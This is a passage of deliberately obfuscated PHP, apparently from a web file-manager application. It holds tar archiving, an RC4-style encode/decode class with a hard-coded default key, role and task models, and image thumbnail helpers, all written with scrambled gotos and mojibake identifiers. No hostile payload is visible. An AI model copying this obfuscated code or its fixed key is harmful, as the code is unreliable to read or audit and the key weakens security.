$Bï×ä³ÜĞ› = Kodio::clear(get_path_father($eèÉ£ƒŸĞï)); if ($eß¦İƒ½­Ô == 0) { $dÔóˆÆ¤¸ó = PclTarCreate($cîé¾¦§™, array($eèÉ£ƒŸĞï), $c ˜«…Ó——, null, $Bï×ä³ÜĞ›); continue; } $dÔóˆÆ¤¸ó = PclTarAddList($cîé¾¦§™, array($eèÉ£ƒŸĞï), $D’îİ®¢ô[33], $Bï×ä³ÜĞ›, $c ˜«…Ó——); } } } return $dÔóˆÆ¤¸ó; } } class Mcrypt { public static $defaultKey = "\141\41\x74\x61\153\101\x3a\x64\x6c\155\143\154\144\105\x76\54\x65"; public static function encode($dĞÄË”ß¾Ü, $a…¬´’†³› = '', $Eæ­Øõµáï = 0, $cëÖ‰£õÂ = '') { goto cŠÈŠ‡ˆ¶; cŠÈŠ‡ˆ¶: $F‘Êãòñõ =& $_SERVER[Ä¿Ş°¨]; $Aö¤¤‰Ö‚£ = 4; $a…¬´’†³› = md5($a…¬´’†³› ? $a…¬´’†³› : self::$defaultKey); goto fÁÖ…óÃá‰; a¿Ñø›ä—Õ: $Dô¤ï‘¶  = substr($cëÖ‰£õÂ, -$Aö¤¤‰Ö‚£); $d£©«™¢ˆŞ = $F—Œ•Î’‰ . md5($F—Œ•Î’‰ . $Dô¤ï‘¶ ); $f¨³³àÍ§“ = strlen($d£©«™¢ˆŞ); goto Aµ‡©ÔŒâô; b¹¶ò¹àÅŞ: $dÎÏ„æàª = $F‘Êãòñõ[33]; for ($d÷´î ìí· = $CÛĞä¶íß = $Bùë‚íĞ¥Å = 0; $Bùë‚íĞ¥Å < $AñïÖŞš¬ø; $Bùë‚íĞ¥Å++) { $d÷´î ìí· = ($d÷´î ìí· + 1) % 256; $CÛĞä¶íß = ($CÛĞä¶íß + $eÕŞ‰ˆØ©Ò[$d÷´î ìí·]) % 256; $Döàç†ò± = $eÕŞ‰ˆØ©Ò[$d÷´î ìí·]; $eÕŞ‰ˆØ©Ò[$d÷´î ìí·] = $eÕŞ‰ˆØ©Ò[$CÛĞä¶íß]; $eÕŞ‰ˆØ©Ò[$CÛĞä¶íß] = $Döàç†ò±; $dÎÏ„æàª .= chr(ord($dĞÄË”ß¾Ü[$Bùë‚íĞ¥Å]) ^ $eÕŞ‰ˆØ©Ò[($eÕŞ‰ˆØ©Ò[$d÷´î ìí·] + $eÕŞ‰ˆØ©Ò[$CÛĞä¶íß]) % 256]); } $dÎÏ„æàª = $Dô¤ï‘¶  . str_replace($F‘Êãòñõ[894], $F‘Êãòñõ[33], base64_encode($dÎÏ„æàª)); goto f›¨óùÀ®; fÁÖ…óÃá‰: $F—Œ•Î’‰ = md5(substr($a…¬´’†³›, 0, 16)); $EÎÏë‡åÏ£ = md5(substr($a…¬´’†³›, 16, 16)); $cëÖ‰£õÂ = $cëÖ‰£õÂ ? $cëÖ‰£õÂ : md5(microtime()); goto a¿Ñø›ä—Õ; aºµ„è¾Ïˆ: for ($Bùë‚íĞ¥Å = 0; $Bùë‚íĞ¥Å <= 255; $Bùë‚íĞ¥Å++) { $eØÖ‡Ë™÷¶[$Bùë‚íĞ¥Å] = ord($d£©«™¢ˆŞ[$Bùë‚íĞ¥Å % $f¨³³àÍ§“]); } $eÕŞ‰ˆØ©Ò = range(0, 255); for ($CÛĞä¶íß = $Bùë‚íĞ¥Å = 0; $Bùë‚íĞ¥Å < 256; $Bùë‚íĞ¥Å++) { $CÛĞä¶íß = ($CÛĞä¶íß + $eÕŞ‰ˆØ©Ò[$Bùë‚íĞ¥Å] + $eØÖ‡Ë™÷¶[$Bùë‚íĞ¥Å]) % 256; $Döàç†ò± = $eÕŞ‰ˆØ©Ò[$Bùë‚íĞ¥Å]; $eÕŞ‰ˆØ©Ò[$Bùë‚íĞ¥Å] = $eÕŞ‰ˆØ©Ò[$CÛĞä¶íß]; $eÕŞ‰ˆØ©Ò[$CÛĞä¶íß] = $Döàç†ò±; } goto b¹¶ò¹àÅŞ; f›¨óùÀ®: $dÎÏ„æàª = str_replace(array($F‘Êãòñõ[280], $F‘Êãòñõ[8], $F‘Êãòñõ[894]), array($F‘Êãòñõ[416], $F‘Êãòñõ[70], $F‘Êãòñõ[91]), $dÎÏ„æàª); return $dÎÏ„æàª; goto E¼´ë„¨÷¢; Aµ‡©ÔŒâô: $dĞÄË”ß¾Ü = sprintf($F‘Êãòñõ[1890], $Eæ­Øõµáï ? $Eæ­Øõµáï + time() : 0) . substr(md5($dĞÄË”ß¾Ü . $EÎÏë‡åÏ£), 0, 16) . $dĞÄË”ß¾Ü; $AñïÖŞš¬ø = strlen($dĞÄË”ß¾Ü); $eØÖ‡Ë™÷¶ = array(); goto aºµ„è¾Ïˆ; E¼´ë„¨÷¢: } public static function decode($cÁÈÛâİ‚´, $BÀ„ÀÆÖ† = '') { goto AŞÃÀ©­È; AŞÃÀ©­È: $f„Í¸á¶†Ş =& $_SERVER[Ä¿Ş°¨]; $cÁÈÛâİ‚´ = str_replace(array($f„Í¸á¶†Ş[416], $f„Í¸á¶†Ş[70], $f„Í¸á¶†Ş[91]), array($f„Í¸á¶†Ş[280], $f„Í¸á¶†Ş[8], $f„Í¸á¶†Ş[894]), $cÁÈÛâİ‚´); $B¹ìº½×¯š = 4; goto d«†êí…½; CŠÙ†ØÍˆí: $CíçÚÒã²Ì = substr($cÁÈÛâİ‚´, 0, $B¹ìº½×¯š); $F ã”²«ò = $fİãç”ˆÜ¯ . md5($fİãç”ˆÜ¯ . $CíçÚÒã²Ì); $eÄ­µé¦¦¦ = strlen($F ã”²«ò); goto B§¹Á•¢À; E†é£¾³“Ş: if (($eÒÄÂİŞôÇ == 0 || $eÒÄÂİŞôÇ - time() > 0) && substr($eİàÁÃáâ, 10, 16) == substr(md5(substr($eİàÁÃáâ, 26) . $AÏñ©–óˆ²), 0, 16)) { return substr($eİàÁÃáâ, 26); } else { return $f„Í¸á¶†Ş[33]; } goto Cá¨¶Á…ëÕ; c×£äõ²ØÇ: for ($CßØá×ÛŠÄ = 0; $CßØá×ÛŠÄ <= 255; $CßØá×ÛŠÄ++) { $eÂµºËÖ„¦[$CßØá×ÛŠÄ] = ord($F ã”²«ò[$CßØá×ÛŠÄ % $eÄ­µé¦¦¦]); } $BŞºŒ¬ñ¢ë = range(0, 255); for ($E†‰Ëõ‰ôÑ = $CßØá×ÛŠÄ = 0; $CßØá×ÛŠÄ < 256; $CßØá×ÛŠÄ++) { $E†‰Ëõ‰ôÑ = ($E†‰Ëõ‰ôÑ + $BŞºŒ¬ñ¢ë[$CßØá×ÛŠÄ] + $eÂµºËÖ„¦[$CßØá×ÛŠÄ]) % 256; $F¢ñëğ‡´¿ = $BŞºŒ¬ñ¢ë[$CßØá×ÛŠÄ]; $BŞºŒ¬ñ¢ë[$CßØá×ÛŠÄ] = $BŞºŒ¬ñ¢ë[$E†‰Ëõ‰ôÑ]; $BŞºŒ¬ñ¢ë[$E†‰Ëõ‰ôÑ] = $F¢ñëğ‡´¿; } goto C°Æ÷ôŸë£; C°Æ÷ôŸë£: $eİàÁÃáâ = $f„Í¸á¶†Ş[33]; for ($DéÏ‡‚½„ = $E†‰Ëõ‰ôÑ = $CßØá×ÛŠÄ = 0; $CßØá×ÛŠÄ < $Eöä˜ÛÓ…; $CßØá×ÛŠÄ++) { $DéÏ‡‚½„ = ($DéÏ‡‚½„ + 1) % 256; $E†‰Ëõ‰ôÑ = ($E†‰Ëõ‰ôÑ + $BŞºŒ¬ñ¢ë[$DéÏ‡‚½„]) % 256; $F¢ñëğ‡´¿ = $BŞºŒ¬ñ¢ë[$DéÏ‡‚½„]; $BŞºŒ¬ñ¢ë[$DéÏ‡‚½„] = $BŞºŒ¬ñ¢ë[$E†‰Ëõ‰ôÑ]; $BŞºŒ¬ñ¢ë[$E†‰Ëõ‰ôÑ] = $F¢ñëğ‡´¿; $eİàÁÃáâ .= chr(ord($cÁÈÛâİ‚´[$CßØá×ÛŠÄ]) ^ $BŞºŒ¬ñ¢ë[($BŞºŒ¬ñ¢ë[$DéÏ‡‚½„] + $BŞºŒ¬ñ¢ë[$E†‰Ëõ‰ôÑ]) % 256]); } $eÒÄÂİŞôÇ = intval(substr($eİàÁÃáâ, 0, 10)); goto E†é£¾³“Ş; d«†êí…½: $BÀ„ÀÆÖ† = md5($BÀ„ÀÆÖ† ? $BÀ„ÀÆÖ† : self::$defaultKey); $fİãç”ˆÜ¯ = md5(substr($BÀ„ÀÆÖ†, 0, 16)); $AÏñ©–óˆ² = md5(substr($BÀ„ÀÆÖ†, 16, 16)); goto CŠÙ†ØÍˆí; B§¹Á•¢À: $cÁÈÛâİ‚´ = base64_decode(substr($cÁÈÛâİ‚´, $B¹ìº½×¯š)); $Eöä˜ÛÓ… = strlen($cÁÈÛâİ‚´); $eÂµºËÖ„¦ = array(); goto c×£äõ²ØÇ; Cá¨¶Á…ëÕ: } } goto Bò‡¦…¾±; A°À‡òÔ–: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\56\162\x6f\154\x65\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\x61\x75\x74\x68", "\154\x61\142\x65\x6c", "\x64\x69\x73\x70\x6c\x61\171", "\x73\171\x73\x74\x65\155", "\144\x65\163\x63", "\x69\147\156\157\162\x65\x45\x78\x74", "\151\x67\156\x6f\162\x65\x46\x69\154\145\123\x69\x7a\145", "\141\144\x6d\151\156\x69\x73\164\162\x61\164\157\162", "\x73\157\162\164"); public function listData($f¦±²à¦°¢ = false, $FÈ”šÂÔ‹© = "\163\157\162\x74", $Fˆ«¹ÅÓ´ô = false) { return parent::listData($f¦±²à¦°¢, $FÈ”šÂÔ‹©, $Fˆ«¹ÅÓ´ô); } public function update($C¡·ÖÇô’´, $C¿éÄ¦§‰—) { goto Eš•¯‘’õ; Eš•¯‘’õ: $B°ñØ¶ö =& $_SERVER[Ä¿Ş°¨]; $A‘«õåùÆİ = parent::listData($C¡·ÖÇô’´); $EĞ•¯Ò½„ = $this->findByName($C¿éÄ¦§‰—[$B°ñØ¶ö[28]]); goto C¬‹ã’Ï“¹; E¦ÂÄ¸òñÆ: return parent::update($C¡·ÖÇô’´, $C¿éÄ¦§‰—); goto fÁê’×øò¹; C¬‹ã’Ï“¹: if (!$A‘«õåùÆİ || $EĞ•¯Ò½„ && $EĞ•¯Ò½„[$B°ñØ¶ö[372]] != $A‘«õåùÆİ[$B°ñØ¶ö[372]]) { return !1; } if ($EĞ•¯Ò½„[$B°ñØ¶ö[2432]] == 1) { $C¿éÄ¦§‰— = array($B°ñØ¶ö[28] => $C¿éÄ¦§‰—[$B°ñØ¶ö[28]], $B°ñØ¶ö[2081] => $C¿éÄ¦§‰—[$B°ñØ¶ö[2081]]); } $this->filterAuth($C¿éÄ¦§‰—[$B°ñØ¶ö[381]]); goto E¦ÂÄ¸òñÆ; fÁê’×øò¹: } public function remove($D”ùÑ±«¢) { $EŠÈØßš‚ = parent::listData($D”ùÑ±«¢); if (!$EŠÈØßš‚ || $EŠÈØßš‚[$_SERVER[Ä¿Ş°¨][1065]]) { return !1; } return parent::remove($D”ùÑ±«¢); } public function add($BŠ“ãËöµë) { goto fÓ›õ”“¬; b´„È÷³¢: return parent::insert($BŠ“ãËöµë); goto dğ¢Ñ©Æñ; CÓÒ—ß“Ï«: $Aáõê¾óù = array($e«ªÒ§µ»ô[391] => $AÜà’È¸—î, $e«ªÒ§µ»ô[2069] => $e«ªÒ§µ»ô[33], $e«ªÒ§µ»ô[2065] => $e«ªÒ§µ»ô[2082], $e«ªÒ§µ»ô[2433] => 1, $e«ªÒ§µ»ô[2068] => 0, $e«ªÒ§µ»ô[2434] => 0, $e«ªÒ§µ»ô[2067] => $this->getSort()); $BŠ“ãËöµë = array_merge($Aáõê¾óù, $BŠ“ãËöµë); $this->filterAuth($BŠ“ãËöµë[$e«ªÒ§µ»ô[381]]); goto b´„È÷³¢; fÓ›õ”“¬: $e«ªÒ§µ»ô =& $_SERVER[Ä¿Ş°¨]; $AÜà’È¸—î = $BŠ“ãËöµë[$e«ªÒ§µ»ô[28]]; if ($this->findByName($AÜà’È¸—î)) { return !1; } goto CÓÒ—ß“Ï«; dğ¢Ñ©Æñ: } private function getSort() { $F­²¯ñœ™¶ =& $_SERVER[Ä¿Ş°¨]; $fÑ­ô«ç‰‘ = parent::listData(); $a²ÆĞÑ‰ÊÌ = array_to_keyvalue($fÑ­ô«ç‰‘, $F­²¯ñœ™¶[33], $F­²¯ñœ™¶[2084]); return empty($a²ÆĞÑ‰ÊÌ) ? 0 : max($a²ÆĞÑ‰ÊÌ) + 1; } private function filterAuth(&$DöÀóğù»‰) { $eª÷–´å½¨ =& $_SERVER[Ä¿Ş°¨]; $F™‡ˆÁö– = array(); $AôŒÀ”ÅÂ = array_filter(explode($eª÷–´å½¨[47], $DöÀóğù»‰)); foreach ($AôŒÀ”ÅÂ as $DöÀóğù»‰) { $b…„æ®„ù = explode($eª÷–´å½¨[91], $DöÀóğù»‰); if ($b…„æ®„ù[0] == $eª÷–´å½¨[1743] && $b…„æ®„ù[1] != $eª÷–´å½¨[1021]) { $D‚ò©•ŒˆÚ = $b…„æ®„ù[0] . $eª÷–´å½¨[91] . $b…„æ®„ù[1] . $eª÷–´å½¨[2435]; if (!in_array($D‚ò©•ŒˆÚ, $AôŒÀ”ÅÂ)) { $F™‡ˆÁö–[] = $D‚ò©•ŒˆÚ; } } $F™‡ˆÁö–[] = $DöÀóğù»‰; } $DöÀóğù»‰ = implode($eª÷–´å½¨[47], $F™‡ˆÁö–); } public function sort($f«¿©‡„¦, $Cœ¬ø¢¡ââ) { return parent::update($f«¿©‡„¦, $Cœ¬ø¢¡ââ); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x74\x61\x73\x6b\x4c\151\163\x74"; public $field = array("\156\141\155\x65", "\x74\x79\160\x65", "\x65\166\x65\x6e\164", "\164\151\x6d\145", "\x64\x65\163\143", "\163\x79\163\164\145\x6d", "\145\x6e\x61\142\x6c\145", "\x6c\x61\163\x74\x52\165\x6e", "\163\157\x72\x74"); public function listData($Aß½ë‘àè¬ = false, $e“óÓŒÖë© = "\163\157\x72\164", $e‚ôõ£³ = false) { return parent::listData($Aß½ë‘àè¬, $e“óÓŒÖë©, $e‚ôõ£³); } public function add($e¶æŠÚç–§) { $b‚»Æ™öĞ =& $_SERVER[Ä¿Ş°¨]; $dí¶æ„¨Ô = $this->findByName($e¶æŠÚç–§[$b‚»Æ™öĞ[28]]); if ($dí¶æ„¨Ô) { return !1; } $e¶æŠÚç–§[$b‚»Æ™öĞ[1364]] = 0; $e¶æŠÚç–§[$b‚»Æ™öĞ[2084]] = $this->getSort(); return parent::insert($e¶æŠÚç–§); } private function getSort() { $E‡†Ë¬ø•Ğ =& $_SERVER[Ä¿Ş°¨]; $cóÇÑ‘‡À = parent::listData(); $Eƒ†ÀØÉ¿¦ = array_to_keyvalue($cóÇÑ‘‡À, $E‡†Ë¬ø•Ğ[33], $E‡†Ë¬ø•Ğ[2084]); return empty($Eƒ†ÀØÉ¿¦) ? 0 : max($Eƒ†ÀØÉ¿¦) + 1; } public function update($F«»¬µÄ¶, $bã›ÂˆÁ‹) { $b„‰ÎàÃâå =& $_SERVER[Ä¿Ş°¨]; $AêŒ•œÕïê = $this->listData($F«»¬µÄ¶); $f­Ç¨‰ÄÎŸ = $this->findByName($bã›ÂˆÁ‹[$b„‰ÎàÃâå[28]]); if (!$AêŒ•œÕïê || $f­Ç¨‰ÄÎŸ && $f­Ç¨‰ÄÎŸ[$b„‰ÎàÃâå[372]] != $AêŒ•œÕïê[$b„‰ÎàÃâå[372]]) { return !1; } return parent::update($F«»¬µÄ¶, $bã›ÂˆÁ‹); } public function remove($e™øÌ®¾Òµ, $eÔĞå”°¶ = false) { $CÔö¸¡÷Ù§ =& $_SERVER[Ä¿Ş°¨]; $Cø»™ùÎÔ = $this->listData($e™øÌ®¾Òµ); if (!$Cø»™ùÎÔ) { return; } if (!$eÔĞå”°¶ && $Cø»™ùÎÔ[$CÔö¸¡÷Ù§[1065]] == $CÔö¸¡÷Ù§[83]) { return !1; } return parent::remove($e™øÌ®¾Òµ); } public function enable($aãèò˜Ñï, $a¨ÅãíÙÙ¢) { return $this->update($aãèò˜Ñï, array($_SERVER[Ä¿Ş°¨][2426] => $a¨ÅãíÙÙ¢)); } public function run($EÖÙ‹ËÑï‰) { return $this->update($EÖÙ‹ËÑï‰, array($_SERVER[Ä¿Ş°¨][2436] => time())); } } goto Eì§¢È®à–; d¹³á½¬“Ø: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($D¶‡¸©Ä–â, $f”¬•ç¨‡’) { goto AªÅñ¹Ä§Ä; AªÅñ¹Ä§Ä: $this->srcFile = $D¶‡¸©Ä–â; $this->echoType = $f”¬•ç¨‡’; $this->im = self::image($D¶‡¸©Ä–â); goto CÁ™­µÍŒ«; BÆ’ùåçÏ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto c¿õó”¿‡; CÁ™­µÍŒ«: if (!$this->im) { return !1; } $BÄ«¯¼è¯ = $_SERVER[Ä¿Ş°¨][33]; $this->imgData = GetImageSize($D¶‡¸©Ä–â, $BÄ«¯¼è¯); goto BÆ’ùåçÏ; c¿õó”¿‡: } public static function image($E†‰×‹¨Ú) { $C«Œ¼äí¹ =& $_SERVER[Ä¿Ş°¨]; $aƒò»ˆ…× = $C«Œ¼äí¹[33]; $A”ä¾ğÆÊØ = GetImageSize($E†‰×‹¨Ú, $aƒò»ˆ…×); $eÙø …ƒø = !1; switch ($A”ä¾ğÆÊØ[2]) { case IMAGETYPE_GIF: if (!function_exists($C«Œ¼äí¹[1823])) { break; } $eÙø …ƒø = imagecreatefromgif($E†‰×‹¨Ú); break; case IMAGETYPE_JPEG: if (!function_exists($C«Œ¼äí¹[1824])) { break; } $eÙø …ƒø = imagecreatefromjpeg($E†‰×‹¨Ú); break; case IMAGETYPE_PNG: if (!function_exists($C«Œ¼äí¹[1825])) { break; } $eÙø …ƒø = @imagecreatefrompng($E†‰×‹¨Ú); imagesavealpha($eÙø …ƒø, !0); break; case IMAGETYPE_XBM: $eÙø …ƒø = imagecreatefromxbm($E†‰×‹¨Ú); break; case IMAGETYPE_WBMP: $eÙø …ƒø = imagecreatefromwbmp($E†‰×‹¨Ú); break; case IMAGETYPE_BMP: $eÙø …ƒø = imagecreatefrombmp($E†‰×‹¨Ú); break; default: break; } return $eÙø …ƒø; } public static function imageSize($DÂÛ–×ŞÛ) { $A‘ã³†ÈÁÜ =& $_SERVER[Ä¿Ş°¨]; $EÊ³ñÍ„º¿ = GetImageSize($DÂÛ–×ŞÛ); if (!$EÊ³ñÍ„º¿) { return !1; } return array($A‘ã³†ÈÁÜ[1826] => $EÊ³ñÍ„º¿[0], $A‘ã³†ÈÁÜ[1827] => $EÊ³ñÍ„º¿[1]); } function distortion($d²ñù™ƒĞ¾, $cÍ‰ìÒ”œ, $fˆì î„ÁÆ) { $DÃÅàŞ­“ = $this->creatImage($this->im, $cÍ‰ìÒ”œ, $fˆì î„ÁÆ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($DÃÅàŞ­“, $d²ñù™ƒĞ¾); } function prorate($B­ÁŞ¥ìãÄ, $bŠ÷ë“½ñ®, $a·ÏŠî¶Õğ) { $Bó–†×š¬ = $bŠ÷ë“½ñ® / $a·ÏŠî¶Õğ; $eØ¯¢°¸Æ­ = $this->srcW / $this->srcH; if ($Bó–†×š¬ <= $eØ¯¢°¸Æ­) { $AÁ­ˆ¦‡† = $bŠ÷ë“½ñ®; $B‡Í– ÈÖì = $AÁ­ˆ¦‡† * ($this->srcH / $this->srcW); } else { $B‡Í– ÈÖì = $a·ÏŠî¶Õğ; $AÁ­ˆ¦‡† = $B‡Í– ÈÖì * ($this->srcW / $this->srcH); } if ($this->srcW > $bŠ÷ë“½ñ® || $this->srcH > $a·ÏŠî¶Õğ) { $eù¤½²¾ÛÙ = $this->creatImage($this->im, $AÁ­ˆ¦‡†, $B‡Í– ÈÖì, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eù¤½²¾ÛÙ, $B­ÁŞ¥ìãÄ); } else { $eù¤½²¾ÛÙ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($eù¤½²¾ÛÙ, $B­ÁŞ¥ìãÄ); } } function cut($fÇˆøÖÜí, $D½‰ğ¨Î‘, $eŒ÷š•±ª‰) { goto CÃÆ¦ÜôÜ¾; AâÖåÊ•ç°: return $this->echoImage($bø—Ş©‡, $fÇˆøÖÜí); goto E¢™‘‚ôË›; EõÙ²›å³ø: $fÁËæ‘ª = $this->creatImage($this->im, $còöƒº‘¦­, $Bø±¥Ì™©, 0, 0, 0, 0, $this->srcW, $this->srcH); $bø—Ş©‡ = $this->creatImage($fÁËæ‘ª, $D½‰ğ¨Î‘, $eŒ÷š•±ª‰, 0, 0, ($còöƒº‘¦­ - $D½‰ğ¨Î‘) / 2, ($Bø±¥Ì™© - $eŒ÷š•±ª‰) / 2, $D½‰ğ¨Î‘, $eŒ÷š•±ª‰); imageDestroy($fÁËæ‘ª); goto AâÖåÊ•ç°; CÃÆ¦ÜôÜ¾: $FËÍïÔÈ†ƒ = $D½‰ğ¨Î‘ / $eŒ÷š•±ª‰; $fº£ƒ‰°á = $this->srcW / $this->srcH; if ($FËÍïÔÈ†ƒ <= $fº£ƒ‰°á) { $Bø±¥Ì™© = $eŒ÷š•±ª‰; $còöƒº‘¦­ = $Bø±¥Ì™© * ($this->srcW / $this->srcH); } else { $còöƒº‘¦­ = $D½‰ğ¨Î‘; $Bø±¥Ì™© = $còöƒº‘¦­ * ($this->srcH / $this->srcW); } goto EõÙ²›å³ø; E¢™‘‚ôË›: } function backFill($E†¨´Úùâë, $f°ÆÂòŞõæ, $CË­‘ÏÁÌ, $AÔì®²¬Œ = false, $eğáÙ–ÂÇ¯ = 255, $D±ô¾Ò¯¡õ = 255, $Bˆò„×ïæŸ = 255) { goto CßæÑæ·Â§; Fİ·Ä´”Ô: if ($AÔì®²¬Œ) { $Eã„ƒ‹’ÏÕ = imageColorTransparent($eÁÆÌĞ¼“‰, $Eã„ƒ‹’ÏÕ); $E˜ÈßñÏõò = $CË­‘ÏÁÌ - $B½’ƒâËâ; } imageFilledRectangle($eÁÆÌĞ¼“‰, 0, 0, $f°ÆÂòŞõæ, $CË­‘ÏÁÌ, $Eã„ƒ‹’ÏÕ); if ($this->srcW > $f°ÆÂòŞõæ || $this->srcH > $CË­‘ÏÁÌ) { $bæŒ³³†ö¨ = $this->creatImage($this->im, $a»™â°ÍÛß, $B½’ƒâËâ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($a»™â°ÍÛß < $f°ÆÂòŞõæ) { imageCopy($eÁÆÌĞ¼“‰, $bæŒ³³†ö¨, ($f°ÆÂòŞõæ - $a»™â°ÍÛß) / 2, 0, 0, 0, $a»™â°ÍÛß, $B½’ƒâËâ); } else { if ($B½’ƒâËâ < $CË­‘ÏÁÌ) { imageCopy($eÁÆÌĞ¼“‰, $bæŒ³³†ö¨, 0, $E˜ÈßñÏõò, 0, 0, $a»™â°ÍÛß, $B½’ƒâËâ); } else { imageCopy($eÁÆÌĞ¼“‰, $bæŒ³³†ö¨, 0, 0, 0, 0, $a»™â°ÍÛß, $B½’ƒâËâ); } } } else { imageCopyMerge($eÁÆÌĞ¼“‰, $this->im, ($f°ÆÂòŞõæ - $a»™â°ÍÛß) / 2, $E˜ÈßñÏõò, 0, 0, $a»™â°ÍÛß, $B½’ƒâËâ, 100); } goto eµ‡ç˜ÆìÏ; CßæÑæ·Â§: $d¡¶©¸©Í‹ = $f°ÆÂòŞõæ / $CË­‘ÏÁÌ; $FÜ÷‹›•Ó = $this->srcW / $this->srcH; if ($d¡¶©¸©Í‹ <= $FÜ÷‹›•Ó) { $a»™â°ÍÛß = $f°ÆÂòŞõæ; $B½’ƒâËâ = $a»™â°ÍÛß * ($this->srcH / $this->srcW); } else { $B½’ƒâËâ = $CË­‘ÏÁÌ; $a»™â°ÍÛß = $B½’ƒâËâ * ($this->srcW / $this->srcH); } goto aÜ÷İÔ¸Í; aÜ÷İÔ¸Í: if (function_exists($_SERVER[Ä¿Ş°¨][1828])) { @($eÁÆÌĞ¼“‰ = imageCreateTrueColor($f°ÆÂòŞõæ, $CË­‘ÏÁÌ)); if (!$eÁÆÌĞ¼“‰) { $eÁÆÌĞ¼“‰ = imageCreate($f°ÆÂòŞõæ, $CË­‘ÏÁÌ); } } else { $eÁÆÌĞ¼“‰ = imageCreate($f°ÆÂòŞõæ, $CË­‘ÏÁÌ); } $E˜ÈßñÏõò = ($CË­‘ÏÁÌ - $B½’ƒâËâ) / 2; $Eã„ƒ‹’ÏÕ = imagecolorallocate($eÁÆÌĞ¼“‰, $eğáÙ–ÂÇ¯, $D±ô¾Ò¯¡õ, $Bˆò„×ïæŸ); goto Fİ·Ä´”Ô; eµ‡ç˜ÆìÏ: return $this->echoImage($eÁÆÌĞ¼“‰, $E†¨´Úùâë); goto Bè¿¹çó¡ö; Bè¿¹çó¡ö: } function creatImage($EÑƒç®ªÓ¶, $f×ÄˆÈ—ç, $D°”°ÜÁ¥, $bóßˆæĞ×, $F©óëÀÒù, $c±ÕÌÔÏ›…, $CÎ‚í¯ó­, $e¢îä™ï±Ë, $B×Ş¡À”´) { if (function_exists($_SERVER[Ä¿Ş°¨][1828])) { @($D¦…ÂÒ­ŞÁ = ImageCreateTrueColor($f×ÄˆÈ—ç, $D°”°ÜÁ¥)); @imagealphablending($D¦…ÂÒ­ŞÁ, !1); @imagesavealpha($D¦…ÂÒ­ŞÁ, !0); if ($D¦…ÂÒ­ŞÁ) { imageCopyResampled($D¦…ÂÒ­ŞÁ, $EÑƒç®ªÓ¶, $bóßˆæĞ×, $F©óëÀÒù, $c±ÕÌÔÏ›…, $CÎ‚í¯ó­, $f×ÄˆÈ—ç, $D°”°ÜÁ¥, $e¢îä™ï±Ë, $B×Ş¡À”´); } else { $D¦…ÂÒ­ŞÁ = ImageCreate($f×ÄˆÈ—ç, $D°”°ÜÁ¥); imageCopyResized($D¦…ÂÒ­ŞÁ, $EÑƒç®ªÓ¶, $bóßˆæĞ×, $F©óëÀÒù, $c±ÕÌÔÏ›…, $CÎ‚í¯ó­, $f×ÄˆÈ—ç, $D°”°ÜÁ¥, $e¢îä™ï±Ë, $B×Ş¡À”´); } } else { $D¦…ÂÒ­ŞÁ = ImageCreate($f×ÄˆÈ—ç, $D°”°ÜÁ¥); imageCopyResized($D¦…ÂÒ­ŞÁ, $EÑƒç®ªÓ¶, $bóßˆæĞ×, $F©óëÀÒù, $c±ÕÌÔÏ›…, $CÎ‚í¯ó­, $f×ÄˆÈ—ç, $D°”°ÜÁ¥, $e¢îä™ï±Ë, $B×Ş¡À”´); } return $D¦…ÂÒ­ŞÁ; } public function imgRotate($eÒƒáŒ«ƒ¢, $f˜„Ÿ¾Ñº) { goto e‰äøÉô™§; A˜Ø¨–§ô¦: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $Cßô¾œ† = imagegif($DÉÉíªä, $eÒƒáŒ«ƒ¢); break; case IMAGETYPE_JPEG: $Cßô¾œ† = imagejpeg($DÉÉíªä, $eÒƒáŒ«ƒ¢, 100); break; case IMAGETYPE_PNG: $Cßô¾œ† = imagePNG($DÉÉíªä, $eÒƒáŒ«ƒ¢); break; default: break; } imageDestroy($DÉÉíªä); imageDestroy($this->im); goto F°£½¸æŒÄ; F°£½¸æŒÄ: return $Cßô¾œ†; goto eîëä®‚ÎÊ; e‰äøÉô™§: if (!$this->im || $f˜„Ÿ¾Ñº % 360 === 0 || !function_exists($_SERVER[Ä¿Ş°¨][1829])) { return !1; } $DÉÉíªä = imageRotate($this->im, 360 - $f˜„Ÿ¾Ñº, 0); $Cßô¾œ† = !1; goto A˜Ø¨–§ô¦; eîëä®‚ÎÊ: } function echoImage($f¢‰Õ±™‘, $D¶ù–ºÁÆó) { goto FÂ×ÚùÔ§Ï; FÂ×ÚùÔ§Ï: $EçÈ¸‹–ëÔ =& $_SERVER[Ä¿Ş°¨]; if (!$f¢‰Õ±™‘) { return !1; } ob_get_clean(); goto d¨Šî¢¤Ûõ; d¨Šî¢¤Ûõ: $B©¶Š°‚¬³ = !1; switch ($this->echoType) { case $EçÈ¸‹–ëÔ[1830]: $B©¶Š°‚¬³ = imagePNG($f¢‰Õ±™‘); break; case $EçÈ¸‹–ëÔ[163]: $B©¶Š°‚¬³ = imagePNG($f¢‰Õ±™‘, $D¶ù–ºÁÆó); break; } imageDestroy($f¢‰Õ±™‘); goto CºˆˆºÊ„; CºˆˆºÊ„: imageDestroy($this->im); return $B©¶Š°‚¬³; goto fíÁğß¡¶; fíÁğß¡¶: } } if (!function_exists($_SERVER[Ä¿Ş°¨][1831])) { define($_SERVER[Ä¿Ş°¨][1832], 0); define($_SERVER[Ä¿Ş°¨][1833], 1); define($_SERVER[Ä¿Ş°¨][1834], 2); function imageflip($Cİâ·¾—¨õ, $EŞºƒºÓë) { switch ($EŞºƒºÓë) { case IMG_FLIP_HORIZONTAL: $c‡•÷Ç¶óß = imagesx($Cİâ·¾—¨õ) - 1; $dÏÜø»Æİ = $c‡•÷Ç¶óß / 2; $eÈ£ä®ÏÛ = imagesy($Cİâ·¾—¨õ); $B ³Çëí = imageistruecolor($Cİâ·¾—¨õ) ? imagecreatetruecolor(1, $eÈ£ä®ÏÛ) : imagecreate(1, 